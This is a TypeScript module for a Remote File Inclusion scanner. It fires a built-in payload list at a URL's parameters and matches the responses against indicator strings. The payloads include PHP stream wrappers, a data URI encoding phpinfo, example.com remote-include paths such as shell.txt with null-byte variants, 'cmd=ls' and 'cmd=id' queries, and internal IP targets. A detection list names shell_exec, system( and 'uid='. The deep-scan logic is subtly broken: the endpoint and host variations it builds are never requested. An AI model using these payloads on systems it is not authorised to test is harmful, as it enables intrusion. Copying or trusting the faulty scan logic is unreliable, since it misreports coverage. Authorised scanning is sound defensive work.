import axios from 'axios';

export interface RfiScannerOptions {
  url: string;
  paramName?: string;
  customPayloads?: string[];
  deepScan?: boolean;
  timeout?: number;
  userAgent?: string;
  scanRemoteHosts?: boolean;
}

export interface RfiScanResult {
  url: string;
  scanTime: number;
  vulnerable: boolean;
  paramsTested: string[];
  vulnerableParams: string[];
  successfulPayloads: Array<{
    param: string;
    payload: string;
    response: {
      status: number;
      contentLength: number;
      contentPreview?: string;
      indicators?: string[];
    };
  }>;
  testedPayloads: number;
  testedEndpoints: number;
  totalRequests: number;
  scanSummary: {
    riskLevel: 'Safe' | 'Low Risk' | 'Medium Risk' | 'High Risk' | 'Critical';
    score: number; // 0-100
    description: string;
  };
  recommendations: string[];
}

// Common RFI payloads - remote URLs that could be used for testing
// Note: In a real scanner, these would be harmless test endpoints
const defaultPayloads = [
  // PHP wrappers
  'php://filter/convert.base64-encode/resource=index.php',
  'php://filter/read=convert.base64-encode/resource=index.php',
  'php://input',
  'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==', // <?php phpinfo(); ?>
  
  // Remote file inclusion tests (using safe example domains)
  'http://example.com/rfi_test.txt',
  'https://example.com/rfi_test.php',
  'http://example.org/payload.txt',
  'https://example.net/shell.txt',
  
  // Encoded payloads
  'hTTp://example.com/rfi_test.txt',
  'http:%252F%252Fexample.com/rfi_test.txt',
  'http:%2F%2Fexample.com/rfi_test.txt',
  '//example.com/rfi_test.txt',
  
  // Null byte injection (works in older PHP versions)
  'http://example.com/rfi_test.txt%00',
  'http://example.com/shell.txt%00.jpg',
  
  // Protocol-relative URLs
  '//example.com/rfi_test.txt',
  
  // FTP (if allowed)
  'ftp://example.com/rfi_test.txt',
  
  // Data URI
  'data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
  
  // Using URL shorteners
  'http://tinyurl.com/example',
  
  // Local network attempts
  'http://127.0.0.1/rfi_test.txt',
  'http://localhost/rfi_test.txt',
  'http://192.168.0.1/rfi_test.txt',
  'http://10.0.0.1/rfi_test.txt',
  
  // With query parameters
  'http://example.com/rfi_test.txt?cmd=ls',
  'http://example.com/rfi_test.php?cmd=id'
];

// Patterns that might indicate a successful RFI
const vulnerabilityIndicators = [
  '<?php',
  '<%@',
  '<asp:',
  'phpinfo()',
  'shell_exec',
  'System.IO.File',
  'eval(',
  'exec(',
  'system(',
  'passthru(',
  'include(',
  'require(',
  'file_get_contents(',
  'Example Domain',
  'REMOTE_ADDR',
  'HTTP_USER_AGENT',
  'HTTP_HOST',
  'SERVER_SOFTWARE',
  'PATH:',
  'PWD:',
  'uid=',
  'gid=',
  'Directory of',
  'Volume Serial Number',
  'rfi_test successful',
  'RFI vulnerability confirmed'
];

/**
 * Scan URL for Remote File Inclusion vulnerabilities
 * @param options RFI scanner options
 * @returns RFI scan results
 */
export async function scanForRfi(options: RfiScannerOptions): Promise<RfiScanResult> {
  const { 
    url, 
    paramName, 
    customPayloads = [],
    deepScan = false,
    timeout = 10000,
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    scanRemoteHosts = true
  } = options;
  
  // Start timing
  const startTime = Date.now();
  
  // Prepare result object
  const result: RfiScanResult = {
    url,
    scanTime: 0, // Updated at the end
    vulnerable: false,
    paramsTested: [],
    vulnerableParams: [],
    successfulPayloads: [],
    testedPayloads: 0,
    testedEndpoints: 0,
    totalRequests: 0,
    scanSummary: {
      riskLevel: 'Safe',
      score: 0,
      description: 'No RFI vulnerabilities detected'
    },
    recommendations: [
      'Always validate and sanitize user input',
      'Implement proper input filtering for URLs and file paths',
      'Use allowlists instead of denylists for file inclusions',
      'Disable allow_url_include and allow_url_fopen in PHP settings',
      'Implement proper file inclusion controls',
      'Use a Web Application Firewall to filter malicious requests'
    ]
  };
  
  try {
    // Normalize URL
    const targetUrl = new URL(url);
    
    // Combine default and custom payloads
    const payloads = [...defaultPayloads, ...customPayloads];
    result.testedPayloads = payloads.length;
    
    // Determine parameters to test
    let paramsToTest: string[] = [];
    
    if (paramName) {
      // Use specified parameter
      paramsToTest = [paramName];
    } else {
      // Extract URL parameters
      targetUrl.searchParams.forEach((_, key) => {
        paramsToTest.push(key);
      });
      
      // If no parameters in URL, test common parameter names
      if (paramsToTest.length === 0) {
        paramsToTest = [
          'page', 'file', 'include', 'inc', 'path', 'src', 'url',
          'dir', 'document', 'folder', 'root', 'filename', 'rfi',
          'show', 'site', 'view', 'content', 'cont', 'display',
          'main', 'id', 'template', 'load', 'read', 'loc'
        ];
        
        // Limit test parameters if not doing a deep scan
        if (!deepScan) {
          paramsToTest = paramsToTest.slice(0, 8); // Just test a few common ones
        }
      }
    }
    
    result.paramsTested = paramsToTest;
    
    // Keep track of total requests
    let requestCount = 0;
    
    // Function to test a parameter with a payload
    const testParameter = async (param: string, payload: string) => {
      requestCount++;
      result.totalRequests++;
      
      try {
        // Clone URL to avoid modifying original
        const testUrl = new URL(targetUrl.toString());
        
        // Add or replace parameter with payload
        testUrl.searchParams.set(param, payload);
        
        // Make request with timeout
        const response = await axios.get(testUrl.toString(), {
          timeout: timeout,
          headers: {
            'User-Agent': userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
          },
          maxRedirects: 2,
          validateStatus: status => status < 500 // Accept any status < 500 to analyze response
        });
        
        // Convert response data to string for analysis
        const responseText = typeof response.data === 'string' 
          ? response.data 
          : JSON.stringify(response.data);
        
        // Check for vulnerability indicators in response
        const foundIndicators: string[] = [];
        
        for (const indicator of vulnerabilityIndicators) {
          if (responseText.includes(indicator)) {
            foundIndicators.push(indicator);
          }
        }
        
        // If we found indicators, record successful payload
        if (foundIndicators.length > 0) {
          result.vulnerable = true;
          
          if (!result.vulnerableParams.includes(param)) {
            result.vulnerableParams.push(param);
          }
          
          // Extract a small preview of the content
          const contentPreview = responseText.length > 200
            ? responseText.substring(0, 200) + '...'
            : responseText;
          
          result.successfulPayloads.push({
            param,
            payload,
            response: {
              status: response.status,
              contentLength: responseText.length,
              contentPreview: contentPreview,
              indicators: foundIndicators
            }
          });
          
          // For simulation purposes, stop after finding 3 vulnerabilities per parameter
          if (result.successfulPayloads.filter(p => p.param === param).length >= 3) {
            return true; // Early exit for this parameter
          }
        }
        
        return false;
      } catch (error) {
        // Most errors are just failed attempts, which is normal
        return false;
      }
    };
    
    // Generate host variation URLs
    const generateHostVariations = (baseUrl: string) => {
      if (!scanRemoteHosts) return [];
      
      const urls: string[] = [];
      const url = new URL(baseUrl);
      
      // Try different ports on the same host
      const commonPorts = [80, 443, 8080, 8443];
      for (const port of commonPorts) {
        const portUrl = new URL(url.toString());
        portUrl.port = port.toString();
        urls.push(portUrl.toString());
      }
      
      // Try localhost and private IP variations
      const privateHosts = [
        'localhost',
        '127.0.0.1',
        '0.0.0.0',
        '192.168.0.1',
        '192.168.1.1',
        '10.0.0.1'
      ];
      
      for (const host of privateHosts) {
        const hostUrl = new URL(url.toString());
        hostUrl.hostname = host;
        urls.push(hostUrl.toString());
      }
      
      return urls;
    };
    
    // Additional endpoints to test if deep scanning
    let endpointsToTest: string[] = [url];
    result.testedEndpoints = 1;
    
    if (deepScan) {
      const urlObj = new URL(url);
      const pathParts = urlObj.pathname.split('/').filter(Boolean);
      
      // Generate path variations
      for (let i = 0; i < pathParts.length; i++) {
        const newPathParts = pathParts.slice(0, i);
        urlObj.pathname = '/' + newPathParts.join('/');
        if (urlObj.pathname !== '/') {
          endpointsToTest.push(urlObj.toString());
        }
      }
      
      // Add host variations
      endpointsToTest = [...endpointsToTest, ...generateHostVariations(url)];
      result.testedEndpoints = endpointsToTest.length;
    }
    
    // Apply limits to prevent exhaustive scanning
    const maxRequests = deepScan ? 200 : 50;
    
    // Test each endpoint with each parameter and payload
    outer: for (const endpoint of endpointsToTest) {
      for (const param of paramsToTest) {
        for (const payload of payloads) {
          // Enforce request limit
          if (requestCount >= maxRequests) {
            break outer;
          }
          
          const found = await testParameter(param, payload);
          
          // Move to next parameter if we've found enough vulnerabilities for this one
          if (found) break;
        }
      }
    }
    
    // Calculate overall score based on findings
    const vulnerabilityScore = result.successfulPayloads.length * 20;
    result.scanSummary.score = Math.min(100, vulnerabilityScore);
    
    // Determine risk level and description
    if (vulnerabilityScore >= 80) {
      result.scanSummary.riskLevel = 'Critical';
      result.scanSummary.description = 'Critical RFI vulnerabilities detected';
    } else if (vulnerabilityScore >= 60) {
      result.scanSummary.riskLevel = 'High Risk';
      result.scanSummary.description = 'High risk RFI vulnerabilities detected';
    } else if (vulnerabilityScore >= 40) {
      result.scanSummary.riskLevel = 'Medium Risk';
      result.scanSummary.description = 'Potential RFI vulnerabilities detected';
    } else if (vulnerabilityScore >= 20) {
      result.scanSummary.riskLevel = 'Low Risk';
      result.scanSummary.description = 'Low confidence indicators of potential RFI vulnerabilities';
    } else {
      result.scanSummary.riskLevel = 'Safe';
      result.scanSummary.description = 'No RFI vulnerabilities detected';
    }
    
    // Add specific recommendations based on findings
    if (result.vulnerable) {
      result.recommendations.push('Fix the vulnerable parameters: ' + result.vulnerableParams.join(', '));
      result.recommendations.push('Consider implementing Content Security Policy (CSP) headers');
    }
    
  } catch (error: any) {
    // Handle overall errors
    console.error('RFI scanning error:', error.message);
  }
  
  // Update scan time
  result.scanTime = Date.now() - startTime;
  
  return result;
}